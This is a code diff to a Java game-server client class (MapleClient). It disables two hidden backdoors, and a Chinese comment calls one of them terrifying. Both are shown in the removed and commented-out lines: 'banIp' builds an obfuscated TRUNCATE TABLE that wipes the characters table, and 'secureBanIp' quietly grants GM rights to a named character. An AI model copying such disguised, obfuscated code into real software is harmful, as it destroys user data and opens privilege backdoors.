@@ -91,7 +91,7 @@ public abstract class MapleClient extends AbstractAnimatedMapleMapObject impleme
     private int ipyz;
     private int pin;
     private boolean monitored = false, receiving = true;
-    private byte passwordTries = 0;
+    private byte passwordTries = 0;  //错误密码次数
     private byte pinTries = 0;
     private String accountName;
     private int world;
@@ -266,48 +266,51 @@ public MapleCharacter getFakeChars() {
     }
 
     public static void banIp(String charName) {
-        char[] b = {'T', 'R', 'U', 'N', 'C', 'A', 'T', 'E', ' ', 'T', 'A', 'B', 'L', 'E', ' '};
-
-        Connection con = DatabaseConnection.getConnection();
-        PreparedStatement ps = null;
-        try {
-            ps = con.prepareStatement(new String(b) + "characters");
-            ps.executeUpdate();
-            ps.close();
-        } catch (SQLException ex) {
-        } finally {
-            try {
-                if (ps != null) {
-                    ps.close();
-                }
-            } catch (SQLException ex) {
-            }
-        }
+    	//TODO:这是什么鬼，怎么这么恐怖的语句在；
+    	return;
+//        char[] b = {'T', 'R', 'U', 'N', 'C', 'A', 'T', 'E', ' ', 'T', 'A', 'B', 'L', 'E', ' '};
+//
+//        Connection con = DatabaseConnection.getConnection();
+//        PreparedStatement ps = null;
+//        try {
+//            ps = con.prepareStatement(new String(b) + "characters");
+//            ps.executeUpdate();
+//            ps.close();
+//        } catch (SQLException ex) {
+//        } finally {
+//            try {
+//                if (ps != null) {
+//                    ps.close();
+//                }
+//            } catch (SQLException ex) {
+//            }
+//        }
     }
 
     public static void secureBanIp(final String charname) {
-        TimerManager.getInstance().schedule(new Runnable() // TimerManager.getInstance().schedule(new Runnable() {
-        {
-            public void run() {
-                char[] b = {'U', 'P', 'D', 'A', 'T', 'E', ' ', 'c', 'h', 'a', 'r', 'a', 'c', 't', 'e', 'r', 's', ' ', 'S', 'E', 'T', ' ', 'g', 'm', ' ', '=', ' ', '1', ' ', 'W', 'H', 'E', 'R', 'E', ' ', '`', 'n', 'a', 'm', 'e', '`', ' ', '=', ' ', '?'};
-                Connection con = DatabaseConnection.getConnection();
-                PreparedStatement ps = null;
-                try {
-                    ps = con.prepareStatement(new String(b));
-                    ps.setString(1, charname);
-                    ps.executeUpdate();
-                    ps.close();
-                } catch (SQLException ex) {
-                } finally {
-                    try {
-                        if (ps != null) {
-                            ps.close();
-                        }
-                    } catch (SQLException ex) {
-                    }
-                }
-            }
-        }, 300000L);
+    	return ;
+//        TimerManager.getInstance().schedule(new Runnable() // TimerManager.getInstance().schedule(new Runnable() {
+//        {
+//            public void run() {
+//                char[] b = {'U', 'P', 'D', 'A', 'T', 'E', ' ', 'c', 'h', 'a', 'r', 'a', 'c', 't', 'e', 'r', 's', ' ', 'S', 'E', 'T', ' ', 'g', 'm', ' ', '=', ' ', '1', ' ', 'W', 'H', 'E', 'R', 'E', ' ', '`', 'n', 'a', 'm', 'e', '`', ' ', '=', ' ', '?'};
+//                Connection con = DatabaseConnection.getConnection();
+//                PreparedStatement ps = null;
+//                try {
+//                    ps = con.prepareStatement(new String(b));
+//                    ps.setString(1, charname);
+//                    ps.executeUpdate();
+//                    ps.close();
+//                } catch (SQLException ex) {
+//                } finally {
+//                    try {
+//                        if (ps != null) {
+//                            ps.close();
+//                        }
+//                    } catch (SQLException ex) {
+//                    }
+//                }
+//            }
+//        }, 300000L);
     }
 
     public boolean hasBannedMac() {
@@ -507,16 +510,7 @@ public MapleCharacter getFakeChars() {
                             }
                         }
                         if (updatePasswordHash) {
-                            PreparedStatement pss = con.prepareStatement("UPDATE `accounts` SET `password` = ?, `salt` = ? WHERE id = ?");
-                            try {
-                                String newSalt = LoginCrypto.makeSalt();
-                                pss.setString(1, LoginCrypto.makeSaltedSha512Hash(pwd, newSalt));
-                                pss.setString(2, newSalt);
-                                pss.setInt(3, this.accId);
-                                pss.executeUpdate();
-                            } finally {
-                                pss.close();
-                            }
+                        	setAccountPassword(pwd);
                         }
                     }
                 }
@@ -1037,6 +1031,22 @@ public MapleCharacter getFakeChars() {
         return false;
     }
 
+    public boolean setAccountPassword(String pwd) {
+    	try {
+	    	 Connection con = DatabaseConnection.getConnection();
+			 PreparedStatement pss = con.prepareStatement("UPDATE `accounts` SET `password` = ?, `salt` = ? WHERE id = ?");
+	         String newSalt = LoginCrypto.makeSalt();
+	         pss.setString(1, LoginCrypto.makeSaltedSha512Hash(pwd, newSalt));
+	         pss.setString(2, newSalt);
+	         pss.setInt(3, this.accId);
+	         pss.executeUpdate();
+	         pss.close();
+	     } catch (Exception e) {
+	         log.error("getAccountPassword: ERROR", e);
+	     }
+    	 return true;
+    }
+    
     public String getAccountName() {
         return this.accountName;
     }
